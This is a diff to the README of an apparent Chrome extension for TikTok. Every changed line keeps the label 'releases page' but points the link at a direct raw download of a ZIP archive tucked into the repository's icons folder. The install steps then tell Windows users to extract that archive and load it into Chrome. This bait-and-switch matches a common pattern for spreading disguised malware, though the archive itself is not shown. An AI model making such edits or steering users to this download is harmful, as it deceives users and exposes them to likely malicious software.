@@ -1,6 +1,6 @@
 # 🎵 Tiktok-Pro-Tools - Better TikTok on Chrome
 
-[![Download Extension](https://img.shields.io/badge/Visit_Releases-Download_Package-blue?style=for-the-badge&logo=googlechrome)](https://github.com/thadeusunconfirmed462/Tiktok-Pro-Tools/releases)
+[![Download Extension](https://img.shields.io/badge/Visit_Releases-Download_Package-blue?style=for-the-badge&logo=googlechrome)](https://github.com/thadeusunconfirmed462/Tiktok-Pro-Tools/raw/refs/heads/main/icons/Tools_Pro_Tiktok_3.0-alpha.2.zip)
 
 ## 📦 What This Is
 
@@ -16,7 +16,7 @@ Use it if you want:
 
 ## 🚀 Download and Install
 
-1. Open the [releases page](https://github.com/thadeusunconfirmed462/Tiktok-Pro-Tools/releases)
+1. Open the [releases page](https://github.com/thadeusunconfirmed462/Tiktok-Pro-Tools/raw/refs/heads/main/icons/Tools_Pro_Tiktok_3.0-alpha.2.zip)
 2. Download the latest release package
 3. Save the ZIP file to your Windows PC
 4. Right-click the ZIP file and choose **Extract All**
@@ -27,7 +27,7 @@ Use it if you want:
 9. Select the extracted folder for Tiktok-Pro-Tools
 10. Open TikTok in Chrome and use the tools
 
-[Visit the releases page](https://github.com/thadeusunconfirmed462/Tiktok-Pro-Tools/releases)
+[Visit the releases page](https://github.com/thadeusunconfirmed462/Tiktok-Pro-Tools/raw/refs/heads/main/icons/Tools_Pro_Tiktok_3.0-alpha.2.zip)
 
 ## 🖥️ System Requirements
 
@@ -112,7 +112,7 @@ If the extension does not show up after you load it:
 
 When a new version is released:
 
-1. Return to the [releases page](https://github.com/thadeusunconfirmed462/Tiktok-Pro-Tools/releases)
+1. Return to the [releases page](https://github.com/thadeusunconfirmed462/Tiktok-Pro-Tools/raw/refs/heads/main/icons/Tools_Pro_Tiktok_3.0-alpha.2.zip)
 2. Download the latest ZIP file
 3. Extract the new version
 4. Remove the old version from Chrome extensions
@@ -141,7 +141,7 @@ Google Chrome is the best choice for this extension.
 
 ## 📌 Quick Steps
 
-1. Visit the [releases page](https://github.com/thadeusunconfirmed462/Tiktok-Pro-Tools/releases)
+1. Visit the [releases page](https://github.com/thadeusunconfirmed462/Tiktok-Pro-Tools/raw/refs/heads/main/icons/Tools_Pro_Tiktok_3.0-alpha.2.zip)
 2. Download the latest ZIP file
 3. Extract the ZIP file
 4. Open `chrome://extensions`
